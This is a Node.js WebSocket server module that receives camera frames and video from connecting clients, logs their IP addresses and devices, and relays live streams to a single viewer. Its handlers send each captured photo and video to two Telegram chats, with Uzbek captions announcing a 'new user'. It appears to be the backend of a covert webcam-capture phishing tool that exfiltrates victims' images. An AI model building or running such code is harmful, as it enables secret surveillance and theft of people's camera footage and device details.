const { v4: uuidv4 } = require('uuid');
const config = require('../config');
const { parseUserAgent, formatDateUz, formatTime } = require('../utils');
const telegram = require('../services/telegram');
const { rateLimiter } = require('../middleware');

// Store rooms and connections
const rooms = new Map();
const wsConnectionCounts = new Map();

function setupWebSocket(wss) {
    wss.on('connection', (ws, req) => {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;

        // Check if blocked
        if (rateLimiter.isBlocked(ip)) {
            console.log(`🚫 Blocked IP attempted connection: ${ip}`);
            ws.close();
            return;
        }

        // Check connection limit
        const connCount = (wsConnectionCounts.get(ip) || 0) + 1;
        wsConnectionCounts.set(ip, connCount);

        if (connCount > config.MAX_WS_CONNECTIONS_PER_IP) {
            console.log(`⚠️ Too many connections from IP: ${ip}`);
            ws.close();
            return;
        }

        console.log(`New WebSocket connection from ${ip} (${connCount}/${config.MAX_WS_CONNECTIONS_PER_IP})`);

        ws.isAlive = true;
        ws.isAuthenticated = false;
        ws.ip = ip;
        ws.messageCount = 0;
        ws.lastMessageReset = Date.now();
        ws.on('pong', () => { ws.isAlive = true; });

        ws.on('message', (data) => handleMessage(ws, data, req));
        ws.on('close', () => handleClose(ws));
        ws.on('error', (err) => {
            console.error('WebSocket error:', err);
            handleClose(ws);
        });
    });

    // Heartbeat
    setInterval(() => {
        wss.clients.forEach((ws) => {
            if (!ws.isAlive) return ws.terminate();
            ws.isAlive = false;
            ws.ping();
        });
    }, 30000);

    return { rooms };
}

async function handleMessage(ws, data, req) {
    try {
        // Rate limit messages
        const now = Date.now();
        if (now - ws.lastMessageReset > 60000) {
            ws.messageCount = 0;
            ws.lastMessageReset = now;
        }
        ws.messageCount++;

        if (ws.messageCount > config.MAX_MESSAGES_PER_MINUTE) {
            console.log(`⚠️ Message rate limit exceeded for IP: ${ws.ip}`);
            ws.send(JSON.stringify({ type: 'error', error: 'Rate limit exceeded' }));
            ws.close();
            return;
        }

        const message = JSON.parse(data.toString());

        // Handle auth
        if (message.type === 'auth') {
            if (config.WS_SECRET_TOKEN && message.token === config.WS_SECRET_TOKEN) {
                ws.isAuthenticated = true;
                ws.send(JSON.stringify({ type: 'auth-success' }));
                console.log('✅ Client authenticated');
            } else {
                ws.send(JSON.stringify({ type: 'auth-failed', error: 'Invalid token' }));
                console.log('❌ Authentication failed');
                ws.close();
            }
            return;
        }

        // Viewer messages allowed without auth
        const viewerMessages = ['join-room', 'answer', 'ice-candidate'];
        if (config.WS_SECRET_TOKEN && !ws.isAuthenticated && !viewerMessages.includes(message.type)) {
            ws.send(JSON.stringify({ type: 'error', error: 'Not authenticated' }));
            ws.close();
            return;
        }

        // Route message
        switch (message.type) {
            case 'create-room':
                createRoom(ws, req, message);
                break;
            case 'join-room':
                joinRoom(ws, message.roomId);
                break;
            case 'offer':
            case 'answer':
            case 'ice-candidate':
                forwardMessage(ws, message);
                break;
            case 'camera-frame':
                await handleCameraFrame(ws, message);
                break;
            case 'camera-video':
                await handleCameraVideo(ws, message);
                break;
            case 'ping':
                ws.send(JSON.stringify({ type: 'pong' }));
                break;
        }
    } catch (err) {
        console.error('Failed to parse message:', err);
    }
}

function createRoom(ws, req, message) {
    const roomId = uuidv4().slice(0, 8);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    rooms.set(roomId, {
        id: roomId,
        broadcaster: ws,
        viewer: null,
        createdAt: new Date(),
        userAgent: message.userAgent || 'Unknown',
        ip
    });

    ws.roomId = roomId;
    ws.role = 'broadcaster';

    const viewerUrl = `${config.SERVER_URL}/view/${roomId}`;

    console.log('\n' + '='.repeat(60));
    console.log('📹 NEW CAMERA STREAM AVAILABLE!');
    console.log('='.repeat(60));
    console.log(`Room ID: ${roomId}`);
    console.log(`IP: ${ip}`);
    console.log(`🔗 VIEWER URL: ${viewerUrl}`);
    console.log('='.repeat(60) + '\n');

    ws.send(JSON.stringify({ type: 'room-created', roomId, viewerUrl }));
}

function joinRoom(ws, roomId) {
    const room = rooms.get(roomId);

    if (!room) {
        ws.send(JSON.stringify({ type: 'error', message: 'Room not found' }));
        return;
    }

    if (room.viewer) {
        ws.send(JSON.stringify({ type: 'error', message: 'Room already has a viewer' }));
        return;
    }

    room.viewer = ws;
    ws.roomId = roomId;
    ws.role = 'viewer';

    ws.send(JSON.stringify({
        type: 'joined-room',
        roomId,
        userAgent: room.userAgent,
        createdAt: room.createdAt
    }));

    if (room.broadcaster.readyState === 1) {
        room.broadcaster.send(JSON.stringify({ type: 'viewer-joined' }));
    }

    console.log(`👀 Viewer joined room: ${roomId}`);
}

function forwardMessage(ws, message) {
    const room = rooms.get(ws.roomId);
    if (!room) return;

    const target = ws.role === 'broadcaster' ? room.viewer : room.broadcaster;
    if (target && target.readyState === 1) {
        target.send(JSON.stringify(message));
    }
}

async function handleCameraFrame(ws, message) {
    const { browser, os } = parseUserAgent(message.userAgent);
    const dateStr = formatDateUz();

    console.log(`\n📸 Camera frame received! (${dateStr}) - ${browser}/${os}`);

    const roomId = ws.roomId || 'unknown';
    const viewerUrl = `${config.SERVER_URL}/view/${roomId}`;

    const caption = `📹 Yangi foydalanuvchi!\n\n📅 ${dateStr}\n📱 ${browser} (${os})\n\n🔗 <a href="${viewerUrl}">Tomosha qilish</a>`;

    const success = await telegram.sendPhotoToBothChats(message.frame, caption);
    ws.send(JSON.stringify({ type: 'frame-received', success }));
}

async function handleCameraVideo(ws, message) {
    const { browser, os } = parseUserAgent(message.userAgent);
    const dateStr = formatDateUz();
    const timeStr = formatTime();

    console.log(`\n🎬 Camera video received! (${dateStr} ${timeStr}) - ${browser}/${os}`);

    const roomId = ws.roomId || 'unknown';
    const viewerUrl = `${config.SERVER_URL}/view/${roomId}`;

    const caption = `🎬 Video yozuv!\n\n📅 ${dateStr}\n⏰ ${timeStr}\n📱 ${browser} (${os})\n\n🔗 <a href="${viewerUrl}">Tomosha qilish</a>`;

    const success = await telegram.sendVideoToBothChats(message.video, caption);
    ws.send(JSON.stringify({ type: 'video-received', success }));
}

function handleClose(ws) {
    // Decrement connection count
    if (ws.ip) {
        const count = wsConnectionCounts.get(ws.ip) || 1;
        if (count <= 1) wsConnectionCounts.delete(ws.ip);
        else wsConnectionCounts.set(ws.ip, count - 1);
    }

    const room = rooms.get(ws.roomId);
    if (!room) return;

    if (ws.role === 'broadcaster') {
        if (room.viewer && room.viewer.readyState === 1) {
            room.viewer.send(JSON.stringify({ type: 'broadcaster-left' }));
        }
        rooms.delete(ws.roomId);
        console.log(`🚪 Room closed: ${ws.roomId}`);
    } else if (ws.role === 'viewer') {
        room.viewer = null;
        if (room.broadcaster && room.broadcaster.readyState === 1) {
            room.broadcaster.send(JSON.stringify({ type: 'viewer-left' }));
        }
        console.log(`👋 Viewer left room: ${ws.roomId}`);
    }
}

module.exports = { setupWebSocket, rooms };
